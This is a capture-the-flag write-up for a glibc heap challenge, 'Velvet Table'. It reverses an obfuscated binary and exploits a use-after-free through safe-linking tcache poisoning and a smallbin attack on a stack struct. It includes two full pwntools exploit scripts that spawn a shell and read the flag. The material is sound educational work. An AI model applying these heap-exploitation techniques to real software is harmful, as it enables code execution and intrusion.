---
title: "Velvet Table"
date: 2026-04-25
releaseDate: "2026-04-28"
tags: ["heap", "smallbin-attack", "tcache-poisoning", "safe-linking", "uaf", "obfuscation"]
topics: ["pwn"]
summary: "Glibc 2.32+ heap note manager wrapped in heavy XOR obfuscation. An inverted size check in the cashout handler turns the dev's careful tcache bookkeeping into a free UAF, with a slightly longer smallbin attack waiting behind it as the intended path."
ctfs: ["umd-26"]
difficulty: medium
---

{{< katex >}}

> the house tightened the rules

```sh
nc challs.umdctf.io 30304
```

---

## First contact

Connect; eight options, vaguely casino-themed:

```
welcome to the velvet table.
house policy: all sales final.
table marker: 0x7c4f1b2e

1) reserve
2) cashout
3) update
4) inspect
5) dealer-note
6) payout
7) settle-ledger
8) leave
> 
```

The "table marker" line is interesting: it prints once on startup and never appears again. Set it aside; almost certainly a leak we'll have to come back to.

A few minutes of poking the menu narrows the action set down to roughly: `reserve` asks for a seat (0..15) and a size, mallocs, prints the heap pointer; `cashout` frees a seat; `update` writes into one; `inspect` dumps it back, but obfuscated. The other four are weirder.

---

## Reverse triage

Checksec:

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
FORTIFY:    Enabled
```

No canary, full RELRO, PIE. `system` is in the imports, and the binary contains:

```c
int win()
{
  puts("yay.");
  return system("/bin/sh");
}
```

So we don't need a libc leak; we just need to call `win`. North star.

Open `main` in IDA and you're greeted by a wall of XOR'd reads/writes, rotates, mixed indices, and bizarre per-iteration key derivations. Resist the temptation to start decoding any of it. The whole pile is, at the end of the day, a heap challenge, so the only thing that matters initially is which menu options touch which heap region, which can free, which can write, which can read.

Under the obfuscation there's a 16-element `.bss` array of records:

```c
struct Table { void *ptr; size_t size; int occupied; };
Table tables[16];
```

Every handler indexes it by a permuted seat number: `idx = ((seat ^ v51) + 3) & 0xF`. `v51` is one of the XOR-derived constants; just a permutation, ignore it. Walking the `switch` cases.

### reserve

```c
size = get_num();
if (size - 0x80 > 0x100) { puts("size rejected.");  break; }   // 0x80 <= size <= 0x180
if (tables[idx].occupied) { puts("seat occupied."); break; }

void *p = malloc(size);
tables[idx].ptr = p;

if (size == 0x100)      { if (tcache_ctr_0x100) tcache_ctr_0x100--; }
else if (size == 0x180) { if (tcache_ctr_0x180) tcache_ctr_0x180--; }

idk_count += 2;
tables[idx].size     = size;
tables[idx].occupied = 1;
__printf_chk(1, "reservation confirmed: %p\n", p);             // heap leak
```

`malloc`, store, print the pointer (heap leak). Sizes clamped to `[0x80, 0x180]`. Two per-size counters decrement when the request matches; we'll see the matching increment in `cashout`.

### cashout

```c
free(tables[idx].ptr);
tables[idx].occupied = 0;
size = tables[idx].size;

if (size == 0x100)      { v38 = tcache_ctr_0x100; v39 = &tcache_ctr_0x100; }
else if (size == 0x180) { v38 = tcache_ctr_0x180; v39 = &tcache_ctr_0x180; }
else goto out;                                                 // <-- pointer never zeroed

if (v38 <= 6) { *v39 = v38 + 1; tables[idx].ptr = NULL; }
out:
++idk_count;
puts("cashed out.");
```

Mirror of `reserve`: free, bump the size-matched counter, null the pointer. The `goto out` for non-matching sizes is going to matter.

### update

```c
length = get_num();
if (length - 1 > 0x3FF) { puts("length rejected."); break; }   // bounded vs 0x400, NOT vs chunk size
get_data(scratch, length);

if (settled) {
    memcpy(tables[idx].ptr, scratch, length);
}
else {
    char v40 = (((u64)&thing >> 4) ^ 0xD9) & 1;
    for (i = 0; i < length; ++i) {
        if ((v40 & 1) == 0)
            ((char *)tables[idx].ptr)[i] = scratch[i];         // every other byte
        ++v40;
    }
}
```

Two write modes. Pre-`settle`: every other byte lands; the rest is left at its previous value. Post-`settle`: clean `memcpy` with no bound on the chunk's actual size, only on `length` itself.

### inspect

```c
size_capped = min(0x40, tables[idx].size);
v15 = 0;
for (i = 0; i < size_capped; ++i) {
    char k = __ROL4__(v15 ^ v49 ^ (0x45D9F3B * v43), (v43 + i) & 7);
    putchar(((char *)tables[idx].ptr)[i] ^ k);
    v15 += 0x9E37;
}
```

XOR-stream cipher, capped to 0x40 bytes per call. The key derives from `v49` and `v43`, both functions of `&thing`. Once we have the marker we can decode this client-side.

### dealer-note

```c
if (idk_count <= 4 || (action_count & 3) != 0) {
    puts("dealer busy."); break;
}
get_data(scratch, 0x20);
for (i = 0; i < 0x20; ++i) {
    v37 = v6 ^ v49;
    v6 += 0x27D4EB2D;
    ((char *)&thing)[i] = scratch[i] ^ (107 * (BYTE2(v37) ^ v37));
}
```

Direct write into the start of `thing` -- a stack-local struct in `main`'s frame, more on it below. 32 bytes, XOR-decoded, gated on the action counters.

### payout

```c
if (idk_count & 1) {
    if (thing.hash == ((u64)thing.func ^ v47 ^ 'house_ed'))
        thing.func();
    else
        puts("house edge.");
}
else {
    puts("payout locked.");
}
```

Calls a stack-local function pointer if a tagged-pointer integrity check passes, and only when `idk_count` is odd. **This is the win primitive.** Rewrite `thing.func` to point at `win` and `thing.hash` to the matching tag, manage parity, and `payout` calls anything.

(`idk_count` is my placeholder name for an opaque counter the handlers all bump. Nothing actually reads its magnitude; only `settle`'s `> 6` check and `payout`'s parity gate do anything with it. Looks like more obfuscation, treated as such.)

### settle-ledger

```c
if (idk_count <= 6) puts("ledger mismatch.");
else { puts("ledger settled."); settled = 1; }
```

Flips `settled` once the counter passes 6. Three reserves and a cashout get there.

### leave

`return` from main. Trivial.

### the stack struct

The struct `dealer-note` writes into and `payout` calls through is laid out in `main`'s frame as:

```c
struct {
    uint64_t prev_size;   // 0
    uint64_t size;        // 0x111
    uint64_t fd;          // 0
    uint64_t bk;          // 0
    void   (*func)(void); // = ticket_rejected
    uint64_t hash;        // = func ^ key ^ 'house_ed'
} thing;
```

The `func`/`hash` pair is the win primitive: rewrite both consistently and `payout` calls whatever `func` is. The first four fields read like the start of a malloc chunk header; that becomes relevant for the intended path.

`'house_ed'` is the C multi-character constant `0x686F7573655F6564`, just a fixed 8-byte literal. The `key` mixed into the hash is one of those XOR-derived values we said we'd ignore for now.

---

Pulling it together -- three benign primitives and three bugs:

- `reserve` leaks a heap pointer.
- `inspect` is our read primitive, stream cipher we can undo client-side.
- `payout` calls `thing.func` if the tagged-pointer hash matches *and* `idk_count` is odd.
- **Cashout:** the size check is inverted. `reserve` decrements the per-size counters; `cashout` only bumps them and nulls the pointer when the size matches `0x100` or `0x180`. Every other size in `[0x80, 0x180]` falls through `goto out` with the pointer **never nulled** -- one cashout on a 0x80 chunk is a clean UAF.
- **Update:** split personality. Pre-`settle` only every other byte lands; post-`settle` it's a clean `memcpy` bounded only on input length (vs `0x400`), **not** the chunk size. Step one of every exploit is calling `settle`, which needs `idk_count > 6` -- four reserves get there.
- **Dealer-note:** 32 bytes written directly into the start of `thing`. That covers `prev_size`/`size`/`fd`/`bk`, not `func`/`hash`. The only handler that touches the stack struct's chunk header without first having a heap pointer aimed there.

The plan, in outline: write `thing.func`/`thing.hash`, then call `payout`. Both paths boil down to that; they only differ in how they construct the alias. Dealer-note can't reach `func` (only the first 32 bytes), so we need a heap pointer aimed at `&thing` and use `update` through it. Constructing that aliasing pointer is the rest of the challenge.

---

## The marker is a stack leak

Back to that line on startup. It comes from:

```c
printf("table marker: 0x%08x\n", ((u64)&thing >> 4) ^ 0x9AC90307);
```

Reading the format: `%08x` prints 32 bits, fed `((u64)&thing >> 4) ^ 0x9AC90307`. Undo the XOR and we have the bottom 32 bits of `&thing >> 4`, i.e. bits 4..35 of `&thing`. The bottom nibble is always 0 (16-byte stack alignment), so we recover bits 4..35 directly; what's missing is bits 36..47 (12 bits at the top).

In practice on Linux x86-64 user-space, those top bits are always `0x7ff` for a stack address -- I've never seen otherwise. So we just hardcode it:

```python
ru(b"table marker: 0x")
table_marker = (int(rl(), 16) ^ 0x9AC90307) << 4
stack_addr   = (0x7ff << 36) | table_marker     # full &thing
```

We have `&thing`. Combined with `payout` calling `thing.func`, the rough plan writes itself: get a heap pointer aimed at `&thing`, write through it, call `payout`. **The how is the rest of the challenge.**

---

## Decoding the keys

Now we go back and look at all the XOR muck. Reading carefully through `main`, every per-menu stream cipher and integrity tag derives from one of three values, and each of those derives from `&thing >> 4`:

```c
key1 = ((u64)&thing >> 4) ^ 0x5A17C3D9;     // 32-bit, used in inspect / dealer-note / payout
key2 = (((u64)&thing >> 4) ^ 0x7E) & 0xF;   // 4-bit, seat permutation
key3 = (u64)key1 << 32;                      // top half of payout's tagged-pointer key
```

In English: knowing the marker means knowing every key in the binary. There's no brute force or pen-and-paper anywhere. Decoding inspect / dealer-note / payout is just a few lines of Python each; the read primitive's cipher is folded out below, and the rest follow the same shape.

<details><summary>Stream cipher behind <code>inspect</code></summary>

Each output byte is:

```python
key2 = ((stack_addr >> 4) ^ 0x7E) & 0xF
v43  = ((seat ^ key2) + 3) & 0xF
v15  = 0
out  = b""
for i, byte in enumerate(raw_bytes):
    k32 = rol((v15 ^ key1 ^ (0x45D9F3B * v43)) & 0xFFFFFFFF,
              (v43 + i) & 7, 32)
    out += bytes([byte ^ (k32 & 0xFF)])
    v15 = (v15 + 0x9e37) & 0xFFFFFFFF
```

The two pitfalls are (a) `__ROL4__` in IDA is rotate-left **32-bit**, not 64-bit, and (b) the assignment in the binary is `s = (char)(byte ^ rol32_result)`, so only the low byte of the rolled value participates. `inspect` is also size-capped at 0x40 bytes per call -- enough for everything we need.

</details>

---

## Easy path: tcache poison through the size hole

Anything in `[0x80, 0x180]` other than the two protected sizes is a UAF on the very first cashout. With UAF on a tcache chunk, this is a textbook safe-linking poison (assumes glibc 2.32+; confirmed empirically). Pick 0x80, chunk size 0x90, tcache bin `[0x90]`:

```python
def prot_ptr(pos, target): return (pos >> 12) ^ target

reserve(4, 0x80)               # extra: bumps idk_count past settle's threshold of 6
reserve(3, 0x80)
pos = reserve(0, 0x80)
cashout(3); cashout(0)         # tcache[0x90] count = 2 (bin indexed by chunk size, not request)

settle()
update(0, 8, p64(prot_ptr(pos, stack_addr)))

reserve(1, 0x80)               # pops `pos`, freelist head -> stack
reserve(2, 0x80)               # pops stack; tables[2].ptr aliases the stack struct
```

Two cashouts because `tcache_get` only consults the freelist while `count > 0`: the first reserve drops the count to 1 and pops `pos`, the second drops it to 0 and pops our forged target.

After step 5 above, `tables[2].ptr` is the stack struct's address. `inspect(2)` reads through the alias, and offset `0x20` lands on `func` (still `ticket_rejected`):

| Read offset | Stack-struct field |
|-------------|--------------------|
| 0x00        | `prev_size` |
| 0x08        | `size` (0x111) |
| 0x10        | `fd` |
| 0x18        | `bk` |
| **0x20**    | **`func` (still `ticket_rejected`)** |
| 0x28        | `hash` |

PIE leak, then write the matching `(func, hash)` pair through the alias and call `payout`:

```python
content = inspect(2)
elf.address = uu64(content[0x20:0x28]) - 0x1b50

win      = elf.address + 0x1b60
win_hash = ((key1 << 32) ^ win ^ 0x686F7573655F6564) & 0xFFFFFFFFFFFFFFFF

update(2, 0x30, b"A" * 0x20 + p64(win) + p64(win_hash))
payout()
```

Done. About ten menu actions, no obfuscation worse than safe-linking and the reverse of `inspect`'s stream cipher.

---

## What was supposed to happen

Look at the cashout snippet again. The shape of the protection -- per-size counter saturating at 7, only nulling while the counter is below threshold -- only makes sense as a **tcache fill tracker**. Once tcache for a given size is full, further frees go to the unsorted bin and the counter freezes. The dev wanted to hand you UAF specifically on an unsorted-bin chunk for sizes 0x100 and 0x180. Those two are arbitrary picks among the binary's smallbin-eligible range -- chunk sizes need to be larger than the 0x80 fastbin cap and smaller than the 0x420 largebin floor, but anything in that band would work.

Combined with `dealer-note` (which writes the first 0x20 bytes of the stack struct -- exactly `prev_size`/`size`/`fd`/`bk`), the binary is staged for a smallbin attack against the stack: free a smallbin-sized chunk into the unsorted bin via the intentional UAF, sort it into a smallbin with a follow-up allocation, then forge the stack as a fake bin neighbour and trigger an unlink.

The intended check should have looked something like:

```c
if (size != 0x100 && size != 0x180) {
    tables[idx].ptr = NULL;            // unsupported sizes: always null, no UAF
    goto out;
}
if (v38 <= 6) {                        // supported sizes: only null while tcache has room
    *v39 = v38 + 1;
    tables[idx].ptr = NULL;
}
```

Instead the check is inverted: unsupported sizes fall through to `goto out` *without* the null. The intended bug was one specific UAF; the implementation produced a dozen.

---

## Intended path: smallbin attack via dealer-note

Now the proper route. The story:

1. Set up so we get UAF on a chunk that's about to land in smallbin `[0x110]`.
2. Use that UAF to make the bin's tail point at the stack struct.
3. Use `dealer-note` to forge the stack struct so the smallbin's consistency check accepts it.
4. Trigger a `malloc(0x100)` -- the smallbin allocator unlinks our victim, then a follow-up loop puts the stack struct into tcache.
5. A further `malloc(0x100)` pops the stack struct out of tcache, returning a "user pointer" that lands inside it.

Solid arrows in the diagrams are `fd`, dashed arrows are `bk`. Smallbins are circular doubly-linked lists.

One pragmatic note before the steps: the server cuts the connection on a wall-clock timer, and this path runs sixteen reserves and eight cashouts plus all the inspect/update/dealer-note/settle/payout actions. Three round-trip `sendlineafter` calls per menu action (one per prompt) misses the window. Every helper in the final exploit batches the whole interaction into a single `sendafter`, like:

```python
def reserve(seat, size):
    sa(b">", f"1\n{seat}\n{size}\n".encode())
    ru(b"reservation confirmed: 0x")
    return int(rl(), 16)
```

A few hundred ms saved per action is the difference between a stable shell and a connection that closes mid-`cat`. Even with batched writes the post-`payout` window is tight, so the final exploit also pre-queues `ls` and `cat ./flag.txt` as `sendline`s before going interactive. The easy path is short enough that round-trip `sendlineafter` still fits; only the intended chain feels the timer.

### Step 1: stage the unsorted-bin UAF

Saturate the 0x100 cashout counter, then do one more cashout:

```python
for i in range(7):
    reserve(15 - i, 0x100)             # warm bodies that will fill tcache
pos = reserve(0, 0x100)                # the chunk we'll preserve a pointer to
reserve(8, 0x180)                      # guard against top-chunk consolidation

for i in range(7):
    cashout(15 - i)                    # tcache_ctr_0x100 saturates at 7
cashout(0)                             # 8th cashout: ptr stays valid, chunk -> unsorted
```

Heap state:

{{< mermaid >}}
flowchart LR
    TC["tcache[0x110]<br/>count = 7"] --> T0["chunk"] --> T1["chunk"] --> Tdots["...four more..."] --> T6["chunk"]

    UB["unsorted bin"] -->|fd| C["chunk C<br/>(seat 0, dangling)"]
    C -->|fd| UB
    C -.->|bk| UB
    UB -.->|bk| C

    style C fill:#ff6b6b,color:#fff
    style UB fill:#868e96,color:#fff
{{< /mermaid >}}

We hold a usable pointer into `C` (its user data starts at `pos`) even though malloc considers it free. The 0x180 reserve at seat 8 sits between `C` and the wilderness; without it, freeing seat 0 would consolidate forward into the top chunk instead of going to the unsorted bin.

### Step 2: sort C into the smallbin

Any allocation that the unsorted bin can't service will walk it, sorting `C` out into the right bin. The 0x180 reserve is convenient for this -- it's not 0x110, so `C` gets pushed out:

```python
reserve(7, 0x180)
```

`_int_malloc` walks unsorted, sees `C` (size 0x110), can't use it for this 0x180 request, sorts it into smallbin `[0x110]`:

{{< mermaid >}}
flowchart LR
    BIN["smallbin[0x110]<br/>(bin head in libc arena)"] -->|fd| C["chunk C<br/>fd = bin_head<br/>bk = bin_head"]
    C -->|fd| BIN
    C -.->|bk| BIN
    BIN -.->|bk| C

    style C fill:#ff6b6b,color:#fff
    style BIN fill:#868e96,color:#fff
{{< /mermaid >}}

Both `C->fd` and `C->bk` point at the bin sentinel in libc. `inspect(0)` reads `C->fd`:

```python
bin_head = uu64(inspect(0)[0:8])       # libc bin sentinel
```

### Step 3: forge the fake "next chunk" on the stack

Smallbin allocation pops the bin's **tail** (`bin->bk`), and on the way out it walks one further hop via `victim->bk` and stashes that hop into tcache via the so-called tcache-stash loop. We want that one-further hop to land on the stack struct.

The next allocation will run two checks against the stack struct:

```c
victim = last(bin);                  // C
bck    = victim->bk;                 // we'll be making this &thing
if (bck->fd != victim) abort();      // (1) so &thing.fd MUST equal C
...
tc_victim = last(bin);               // &thing  (after the line above sets bin->bk = bck)
bck       = tc_victim->bk;           // (2) we want this = bin_head, so the loop terminates
```

Translation: `*(stack_addr + 0x10)` (the `fd` slot of the stack struct) must equal `C`'s **chunk** address (`pos - 0x10`), and `*(stack_addr + 0x18)` (the `bk` slot) must equal `bin_head`. The `prev_size` and `size` slots aren't read on this path, but the binary already initialises them to a reasonable header so we just preserve it:

{{< mermaid >}}
block-beta
    columns 2
    a["+0x00<br/>prev_size = 0"] b["+0x08<br/>size = 0x111"]
    c["+0x10<br/>fd = pos - 0x10<br/>(satisfies bck->fd check)"] d["+0x18<br/>bk = bin_head<br/>(terminates stash loop)"]
    e["+0x20<br/>func<br/>(unchanged for now)"] f["+0x28<br/>hash<br/>(unchanged for now)"]
    style c fill:#51cf66,color:#fff
    style d fill:#51cf66,color:#fff
{{< /mermaid >}}

`dealer-note` writes exactly the first 0x20 bytes -- the green/blue header -- and nothing further. That's why it exists in the binary at all:

```python
fake_chunk = p64(0) + p64(0x110 | 1) + p64(pos - 0x10) + p64(bin_head)
dealer_note(fake_chunk)
settle()
```

### Step 4: link the stack into the smallbin via the UAF

Right now the smallbin only knows about `C`. We need `C->bk` to lie and say "the next chunk is the stack region". `update` after `settle` is a clean memcpy:

```python
update(0, 0x10, p64(bin_head) + p64(stack_addr))
```

(We rewrite `fd` too with the same value libc already had there. Only `bk` matters for the attack.)

State now -- the bin head still believes the chain is just `bin <-> C`, but `C` has been told that its `bk` neighbour is the stack:

{{< mermaid >}}
flowchart LR
    BIN["smallbin[0x110]<br/>(libc)"] -->|fd| C["chunk C<br/>fd = bin_head<br/>bk = stack_addr ✗"]
    C -->|fd| BIN
    BIN -.->|bk| C
    C -.->|bk| S["fake stack chunk<br/>fd = pos - 0x10 (= C)<br/>bk = bin_head"]
    S -.->|bk| BIN
    S -->|fd| C

    style C fill:#ff6b6b,color:#fff
    style S fill:#51cf66,color:#fff
    style BIN fill:#868e96,color:#fff
{{< /mermaid >}}

The dashed `bk` chain now reads: `BIN <- C <- stack <- BIN`, three hops instead of two -- glibc thinks the smallbin has two chunks. The solid `fd` chain libc walks from the head still goes `BIN -> C -> BIN`, because we never had the means to corrupt `bin->fd` (it's in libc's arena). The lie is one-sided.

That asymmetry is exactly what the smallbin allocator falls for. It only walks `bk` hops one step and only validates one hop deep -- it asks `bck->fd == victim?`, doesn't ask `bin->fd == victim` or anything more thorough. Our forged `stack.fd = C` makes the one check it does run pass.

### Step 5: trigger the smallbin allocation

Drain the 0x110 tcache so the next `malloc(0x100)` has to use the smallbin path:

```python
for i in range(7):
    reserve(15 - i, 0x100)             # tcache_ctr_0x100 -> 0
```

Then trigger:

```python
reserve(0, 0x100)
```

Inside `_int_malloc`'s smallbin path:

```c
victim = last(bin);                  // C
bck    = victim->bk;                 // stack_addr
if (bck->fd != victim) abort();      // stack.fd == C, passes ✓
bin->bk = bck;                       // bin->bk = stack_addr
bck->fd = bin;                       // stack.fd <- bin_head (clobbers our forged fd)

/* tcache stash loop runs once */
tc_victim = last(bin);               // stack_addr
bck       = tc_victim->bk;           // stack.bk == bin_head
bin->bk   = bck;                     // last(bin) == bin -> next iter exits
tcache_put(tc_victim, idx);          // stack_addr -> tcache[0x110]

return chunk2mem(victim);            // returns C
```

Three writes happen we didn't have direct control over, none of them matter: the two `bin->bk` writes both update libc's arena, and the `stack.fd <- bin_head` write clobbers our forged-but-already-used `fd` slot. After this:

{{< mermaid >}}
flowchart LR
    TC["tcache[0x110]<br/>count = 1"] --> S["stack_addr<br/>(stashed by smallbin loop)"]
    style S fill:#51cf66,color:#fff
{{< /mermaid >}}

### Step 6: pop the stack out of tcache

Next `malloc(0x100)` pops it directly:

```python
reserve(1, 0x100)                    # tables[1].ptr = chunk2mem(stack_addr) = stack_addr + 0x10
```

`tables[1].ptr` lands at `stack_addr + 0x10`, which is the `fd` slot of the stack struct. Reading offset 0x10 past that pointer hits `func`:

| Read offset | Stack-struct field |
|-------------|--------------------|
| 0x00        | `fd` (now `bin_head`, clobbered by the unlink) |
| 0x08        | `bk` (now `bin_head` from the stash loop) |
| **0x10**    | **`func` (still `ticket_rejected`)** |
| 0x18        | `hash` |

PIE leak, then write through:

```python
content = inspect(1)
elf.address = uu64(content[0x10:0x18]) - 0x1b50

win      = elf.address + 0x1b60
win_hash = ((key1 << 32) ^ win ^ 0x686F7573655F6564) & 0xFFFFFFFFFFFFFFFF

update(1, 0x20, b"A" * 0x10 + p64(win) + p64(win_hash))
cashout(15)                          # parity bump for payout
payout()
```

---

## Final exploits

<details><summary>Full <code>solve.py</code> for the unintended tcache poison</summary>

```python
from pwn import *

elf = context.binary = ELF("./velvet-table")

def ru(*a, **k): return p.recvuntil(*a, **k, drop=True)
def rl(*a, **k): return p.recvline(*a, **k, keepends=False)
def sla(*a, **k): return p.sendlineafter(*a, **k)
def sa(*a, **k): return p.sendafter(*a, **k)
def sl(*a, **k): return p.sendline(*a, **k)
def uu64(d): return u64(d.ljust(8, b"\0"))

def prot_ptr(pos, ptr): return (pos >> 12) ^ ptr

p = remote("challs.umdctf.io", 30304)

ru(b"table marker: 0x")
table_marker = (int(rl(), 16) ^ 0x9AC90307) << 4
stack_addr   = (0x7ff << 36) | table_marker
key1         = (stack_addr >> 4) ^ 0x5A17C3D9

def reserve(seat, size):
    sla(b"> ", b"1"); sla(b"seat: ", str(seat).encode()); sla(b"size: ", str(size).encode())
    ru(b"reservation confirmed: 0x")
    return int(rl(), 16)

def cashout(seat): sla(b"> ", b"2"); sla(b"seat: ", str(seat).encode())
def update(seat, length, data):
    sla(b"> ", b"3"); sla(b"seat: ", str(seat).encode())
    sla(b"length: ", str(length).encode()); sa(b"data:\n", data)
def settle(): sla(b"> ", b"7")
def payout(): sla(b"> ", b"6")

def inspect(seat):
    sla(b"> ", b"4"); sla(b"seat: ", str(seat).encode())
    res = ru(b"\n1)")
    key2 = ((stack_addr >> 4) ^ 0x7E) & 0xF
    v43 = ((seat ^ key2) + 3) & 0xF
    v15, out = 0, b""
    for i, byte in enumerate(res):
        k32 = rol((v15 ^ key1 ^ (0x45D9F3B * v43)) & 0xFFFFFFFF, (v43 + i) & 7, 32)
        out += bytes([byte ^ (k32 & 0xFF)])
        v15 = (v15 + 0x9e37) & 0xFFFFFFFF
    return out

reserve(4, 0x80)               # extra: bumps idk_count past settle's threshold
reserve(3, 0x80)
pos = reserve(0, 0x80)
cashout(3); cashout(0)         # tcache[0x90] count = 2
settle()

update(0, 8, p64(prot_ptr(pos, stack_addr)))
reserve(1, 0x80)             # pops original chunk, freelist head -> stack
reserve(2, 0x80)             # pops stack address

content = inspect(2)
elf.address = uu64(content[0x20:0x28]) - 0x1b50

win      = elf.address + 0x1b60
win_hash = ((key1 << 32) ^ win ^ 0x686F7573655F6564) & 0xFFFFFFFFFFFFFFFF
update(2, 0x30, b"A" * 0x20 + p64(win) + p64(win_hash))
payout()

sl(b"cat ./flag.txt")
p.interactive()
```

</details>

<details><summary>Full <code>solve.py</code> for the intended smallbin attack</summary>

```python
from pwn import *

elf = context.binary = ELF("./velvet-table")

def ru(*a, **k): return p.recvuntil(*a, **k, drop=True)
def rl(*a, **k): return p.recvline(*a, **k, keepends=False)
def sa(*a, **k): return p.sendafter(*a, **k)
def sl(*a, **k): return p.sendline(*a, **k)
def uu64(d): return u64(d.ljust(8, b"\0"))

p = remote("challs.umdctf.io", 30304)

ru(b"table marker: 0x")
table_marker = (int(rl(), 16) ^ 0x9AC90307) << 4
stack_addr   = (0x7ff << 36) | table_marker
key1         = (stack_addr >> 4) ^ 0x5A17C3D9

action_count = 0
def reserve(seat, size):
    global action_count
    action_count += 1
    sa(b">", f"1\n{seat}\n{size}\n".encode())
    ru(b"reservation confirmed: 0x")
    return int(rl(), 16)

def cashout(seat):
    global action_count
    action_count += 1
    sa(b">", f"2\n{seat}\n".encode())

def update(seat, length, data):
    global action_count
    action_count += 1
    sa(b">", f"3\n{seat}\n{length}\n".encode() + data)

def settle():
    global action_count
    action_count += 1
    sa(b">", b"7\n")

def payout():
    global action_count
    action_count += 1
    sa(b">", b"6\n")

def inspect(seat):
    global action_count
    action_count += 1
    sa(b">", f"4\n{seat}\n".encode())
    res = ru(b"\n1) reserve")
    key2 = ((stack_addr >> 4) ^ 0x7E) & 0xF
    v43 = ((seat ^ key2) + 3) & 0xF
    v15, out = 0, b""
    for i, byte in enumerate(res):
        k32 = rol((v15 ^ key1 ^ (0x45D9F3B * v43)) & 0xFFFFFFFF, (v43 + i) & 7, 32)
        out += bytes([byte ^ (k32 & 0xFF)])
        v15 = (v15 + 0x9e37) & 0xFFFFFFFF
    return out

def dealer_note(note):
    global action_count
    v6 = action_count & 3
    action_count += 1
    obfuscated = b""
    for byte in note:
        v37 = v6 ^ key1
        v6 = (v6 + 0x27D4EB2D) & 0xFFFFFFFFFFFFFFFF
        mixed = ((v37 >> 0x10) ^ v37) & 0xFF
        obfuscated += bytes([byte ^ ((0x6b * mixed) & 0xff)])
    sa(b">", b"5\n" + obfuscated)

# saturate 0x100 protection, then one more cashout into unsorted bin (UAF preserved)
for i in range(7):
    reserve(15 - i, 0x100)
pos = reserve(0, 0x100)
reserve(8, 0x180)                          # guard against top-chunk consolidation

for i in range(7):
    cashout(15 - i)                        # tcache_ctr_0x100 = 7 (saturated)
cashout(0)                                 # ptr stays valid; chunk -> unsorted bin

reserve(7, 0x180)                          # walks unsorted, sorts our 0x110 into smallbin

bin_head = uu64(inspect(0)[0:8])

# Forge fake chunk on the stack so smallbin consistency check passes:
# stack.fd must equal the victim chunk address (= pos - 0x10).
fake_chunk = p64(0) + p64(0x110 | 1) + p64(pos - 0x10) + p64(bin_head)
dealer_note(fake_chunk)
settle()

# Rewire the smallbin chunk: bk = stack so the next malloc unlinks through our forgery.
update(0, 0x10, p64(bin_head) + p64(stack_addr))

# Drain the 0x100 tcache so the next reserve takes the smallbin path.
for i in range(7):
    reserve(15 - i, 0x100)

reserve(0, 0x100)                          # smallbin unlink + tcache-stash stack_addr
reserve(1, 0x100)                          # pop stack -- tables[1].ptr is stack-aliased

content = inspect(1)
elf.address = uu64(content[0x10:0x18]) - 0x1b50

win      = elf.address + 0x1b60
win_hash = ((key1 << 32) ^ win ^ 0x686F7573655F6564) & 0xFFFFFFFFFFFFFFFF
update(1, 0x20, b"A" * 0x10 + p64(win) + p64(win_hash))

cashout(15)                                # parity bump for payout
payout()

sl(b"ls")
sl(b"cat ./flag.txt")
p.interactive()
```

</details>

---

## Flag

```
UMDCTF{smallbins_still_love_the_stack_when_the_house_sets_the_table}
```
